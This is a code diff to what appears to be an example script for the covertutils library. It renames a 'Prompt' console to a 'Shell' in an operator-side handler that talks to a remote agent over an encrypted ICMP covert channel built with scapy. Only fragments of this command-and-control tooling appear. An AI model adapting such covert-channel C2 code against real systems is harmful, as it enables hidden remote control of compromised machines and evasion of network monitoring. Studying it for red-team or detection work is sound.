@@ -3,7 +3,7 @@
 
 from covertutils.handlers import ResponseOnlyHandler
 from covertutils.orchestration import SimpleOrchestrator
-from covertutils.prompts import PrintPrompt
+from covertutils.shells import PrintShell
 
 from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
 from scapy.all import send as scapy_send	# unexpected things will happen
@@ -71,7 +71,7 @@ sniff_thread.start()			# Run the ICMP reply collector in a thread
 #============================== Handler Overriding part ===================
 
 #	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
-#		(Except if we use adHocSend() by hand - later in Prompt creation)
+#		(Except if we use adHocSend() by hand - later in Shell creation)
 class Handler( ResponseOnlyHandler ) :
 
 	def onMessage( self, stream, message ) :	# When a Message arrives
@@ -111,15 +111,15 @@ orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from 
 				reverse = True )	# Reverse the encryption channels - Agent has `reverse = False`
 
 handler = Handler( recv, send, orchestrator )	# Instantiate the Handler object. Finally!
-handler.preferred_send = handler.sendAdHoc	# Change the preferred method to use it with the prompt.
-# This way the prompt will iterate a message sending and the ResponseOnlyHandler will do the ping-pong
+handler.preferred_send = handler.sendAdHoc	# Change the preferred method to use it with the shell.
+# This way the shell will iterate a message sending and the ResponseOnlyHandler will do the ping-pong
 
 #==========================================================================
 
 
-#============================== Prompt Design part ========================
-prompt = PrintPrompt( handler )
-prompt.start()
+#============================== Shell Design part ========================
+shell = PrintShell( handler )
+shell.start()
 
 #==========================================================================
 
